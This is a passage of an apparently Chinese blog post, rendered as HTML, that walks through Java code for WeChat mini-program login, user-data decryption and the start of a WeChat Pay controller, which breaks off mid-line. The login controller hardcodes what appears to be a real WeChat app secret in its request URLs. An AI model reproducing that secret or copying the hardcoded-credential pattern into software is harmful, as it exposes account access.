class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.obox.obox.Utils;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.bouncycastle.jce.provider.BouncyCastleProvider;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.AlgorithmParameters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.Security;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WxUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">getUserInfo</span><span class="params">(String encryptedData, String sessionKey, String iv)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 被加密的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] dataByte = Base64.decode(encryptedData);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加密秘钥</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] keyByte = Base64.decode(sessionKey);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 偏移量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] ivByte = Base64.decode(iv);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果密钥不足16位，那么就补足.  这个if 中的内容很重要</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> base = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (keyByte.length % base != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> groups = keyByte.length / base + (keyByte.length % base != <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[groups * base];</span><br><span class="line"></span><br><span class="line">                Arrays.fill(temp, (<span class="keyword">byte</span>) <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                System.arraycopy(keyByte, <span class="number">0</span>, temp, <span class="number">0</span>, keyByte.length);</span><br><span class="line"></span><br><span class="line">                keyByte = temp;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 初始化</span></span><br><span class="line"></span><br><span class="line">            Security.addProvider(<span class="keyword">new</span> BouncyCastleProvider());</span><br><span class="line"></span><br><span class="line">            Cipher cipher = Cipher.getInstance(<span class="string">"AES/CBC/PKCS7Padding"</span>,<span class="string">"BC"</span>);</span><br><span class="line"></span><br><span class="line">            SecretKeySpec spec = <span class="keyword">new</span> SecretKeySpec(keyByte, <span class="string">"AES"</span>);</span><br><span class="line"></span><br><span class="line">            AlgorithmParameters parameters = AlgorithmParameters.getInstance(<span class="string">"AES"</span>);</span><br><span class="line"></span><br><span class="line">            parameters.init(<span class="keyword">new</span> IvParameterSpec(ivByte));</span><br><span class="line"></span><br><span class="line">            cipher.init(Cipher.DECRYPT_MODE, spec, parameters);<span class="comment">// 初始化</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] resultByte = cipher.doFinal(dataByte);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">null</span> != resultByte &amp;&amp; resultByte.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                String result = <span class="keyword">new</span> String(resultByte, <span class="string">"UTF-8"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> JSONObject.parseObject(result);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="微信登陆"><a href="#微信登陆" class="headerlink" title="微信登陆"></a>微信登陆</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.controller.WeChat.WxApp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.obox.obox.Utils.IdUtil;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.Utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.Utils.WxUtils;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.mapper.InsertMapper.UserInsert;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.mapper.WxToolMapper;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.mapper.selectMapper.UserSelect;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.WxLogin.AccessToken;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.WxLogin.Encrycode;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.WxLogin.EncryptedData;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.token.NoToken;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.wechat.UO;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.wechat.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jws.soap.SOAPBinding;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"login"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WxToolMapper wxToolMapper ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserInsert userInsert ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserSelect userSelect ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NoToken</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"getlogin"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">Login</span><span class="params">(@RequestParam(value = <span class="string">"data"</span>,required = <span class="keyword">true</span>)</span> String data)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//WxLoginParams wxLoginParams = JSONObject.parseObject(data,WxLoginParams.class) ;</span></span><br><span class="line">        <span class="comment">//WxLoginParams params = new WxLoginParams() ;</span></span><br><span class="line">        <span class="comment">//params.setJs_code(data);</span></span><br><span class="line">        Map&lt;String,String&gt; p = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        p.put(<span class="string">"appid"</span>,<span class="string">"wxfd4904504d50f9c2"</span>) ;</span><br><span class="line">        p.put(<span class="string">"secret"</span>,<span class="string">"1dcfdc0d47acda452a66a834f730340a"</span>) ;</span><br><span class="line">        p.put(<span class="string">"js_code"</span>,data) ;</span><br><span class="line">        p.put(<span class="string">"grant_type"</span>,<span class="string">"authorization_code"</span>) ;</span><br><span class="line">        String url = <span class="string">"https://api.weixin.qq.com/sns/jscode2session?appid=wxfd4904504d50f9c2&amp;secret=1dcfdc0d47acda452a66a834f730340a&amp;js_code="</span>+data+<span class="string">"&amp;grant_type=authorization_code"</span> ;</span><br><span class="line"></span><br><span class="line">        String json = restTemplate.getForObject(url,String.class) ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  json ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@NoToken</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/token"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">Token</span><span class="params">(@RequestBody String data)</span> <span class="keyword">throws</span> Base64DecodingException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回信息</span></span><br><span class="line">        Map&lt;String,Object&gt; d = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        Encrycode encrycode = JSONObject.parseObject(data,Encrycode.class) ;</span><br><span class="line">        String s = <span class="string">"https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=wxfd4904504d50f9c2&amp;secret=1dcfdc0d47acda452a66a834f730340a"</span>;</span><br><span class="line">        <span class="comment">// 获取token</span></span><br><span class="line">        String token = restTemplate.getForObject(s,String.class) ;</span><br><span class="line">        d.put(<span class="string">"token"</span>,JSONObject.parseObject(token, AccessToken.class)) ;</span><br><span class="line">        <span class="comment">//data.put("code", WxUtils.decryptData(encrypte_data,session_key,iv));</span></span><br><span class="line">        <span class="comment">// 解密encrypted</span></span><br><span class="line">        d.put(<span class="string">"code"</span>,WxUtils.getUserInfo(encrycode.getEncrypted_data(),encrycode.getSession_key(),encrycode.getIv()));</span><br><span class="line">        <span class="comment">// 取openid</span></span><br><span class="line">        EncryptedData encryptedData = JSONObject.parseObject(JSONObject.toJSONString(WxUtils.getUserInfo(encrycode.getEncrypted_data(),encrycode.getSession_key(),encrycode.getIv())),EncryptedData.class) ;</span><br><span class="line">        <span class="comment">// 根据openid查找uid</span></span><br><span class="line">        UO uo = <span class="keyword">new</span> UO() ;</span><br><span class="line">        uo.setOpenid(encryptedData.getOpenId());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (wxToolMapper.SelectUOByOpenid(uo.getOpenid()) == <span class="keyword">null</span>)&#123; <span class="comment">// 表中无用户信息,插入用户信息</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// uo表中插入</span></span><br><span class="line">            uo.setUid(IdUtil.Uid());</span><br><span class="line">            wxToolMapper.InsertUO(uo) ;</span><br><span class="line">            <span class="comment">// 插入用户初始化信息</span></span><br><span class="line">            UserInfo userInfo = <span class="keyword">new</span> UserInfo() ;</span><br><span class="line">            userInfo.setUid(uo.getUid());</span><br><span class="line">            userInfo.setUsex(encryptedData.getGender());</span><br><span class="line">            userInfo.setUicon(encryptedData.getAvatarUrl());</span><br><span class="line">            userInfo.setUname(encryptedData.getNickName());</span><br><span class="line">            userInfo.setOpenid(encryptedData.getOpenId());</span><br><span class="line">            userInsert.InserUserInfo(userInfo) ;</span><br><span class="line">            d.put(<span class="string">"user"</span>,userInfo) ;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123; <span class="comment">// 如果表中已经含有用户信息，则直接查找</span></span><br><span class="line"></span><br><span class="line">            UO u = wxToolMapper.SelectUOByOpenid(uo.getOpenid()) ;</span><br><span class="line">            String uid = u.getUid() ;</span><br><span class="line">            UserInfo userInfo = userSelect.SelectUserInfoByUid(uid) ;</span><br><span class="line">            d.put(<span class="string">"user"</span>,userInfo) ;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成用户token</span></span><br><span class="line"></span><br><span class="line">        String jwtuid = uo.getUid() ;</span><br><span class="line">        Map&lt;String,Object&gt; jwt = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        jwt.put(<span class="string">"wxdata"</span>,encryptedData) ;</span><br><span class="line">        jwt.put(<span class="string">"uid"</span>,jwtuid) ;</span><br><span class="line"></span><br><span class="line">        String payload = JSONObject.toJSONString(jwt) ;</span><br><span class="line">        d.put(<span class="string">"token"</span>, JwtUtils.geneJsonWebToken(payload));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> d ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="微信支付统一下单接口"><a href="#微信支付统一下单接口" class="headerlink" title="微信支付统一下单接口"></a>微信支付统一下单接口</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.controller.WeChat.WxPay;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ser.Serializers;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.Utils.IdUtil;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.Utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.mapper.BOMapper;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.mapper.BusinessMapper;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.mapper.InsertMapper.BaseOrderListInsert;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.mapper.QRMapper;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.mapper.selectMapper.BaseOrderListSelect;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.WxLogin.EncryptedData;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.WxPay.BO;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.WxPay.WxOrderGoodsInfo;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.WxPay.WxOrderList;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.token.NoToken;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.wechat.BaseOrderList;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.wechat.CheckSales;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.service.QR.QRService;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.service.wxpay.WxPaySDK.WXPayConstants;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.service.wxpay.WxPaySDK.WXPayUtil;</span><br><span class="line"><span class="keyword">import</span> com.sun.istack.internal.FinalArrayList;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.json.JsonObjectDecoder;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.converter.StringHttpMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.sql.Struct;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 微信小程序支付</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/wxpay"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WxPayController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BaseOrderListInsert baseOrderListInsert ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BaseOrderListSelect baseOrderListSelect ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BusinessMapper businessMapper ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> QRMapper qrMapper ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BOMapper boMapper ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 订单下单</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/sendwxpay"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">RequestWxPayAPI</span><span class="params">(@RequestBody String data, HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Token获取</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        String token = request.getHeader(<span class="string">"Authorization"</span>);</span><br><span class="line">        <span 